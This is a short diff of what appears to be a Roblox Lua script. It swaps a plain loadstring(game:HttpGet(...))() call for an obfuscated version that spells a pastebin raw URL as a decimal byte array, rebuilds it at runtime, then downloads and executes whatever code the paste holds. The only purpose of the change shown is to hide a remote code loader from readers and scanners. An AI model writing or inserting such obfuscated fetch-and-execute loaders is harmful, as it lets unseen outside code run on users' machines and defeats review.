@@ -1,1 +1,7 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/XXqdK764"))()
+local bytes = {104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,88,88,113,100,75,55,54,52}
+local url = ""
+for i = 1, #bytes do
+    url = url .. string.char(bytes[i])
+end
+
+loadstring(game:HttpGet(url))()
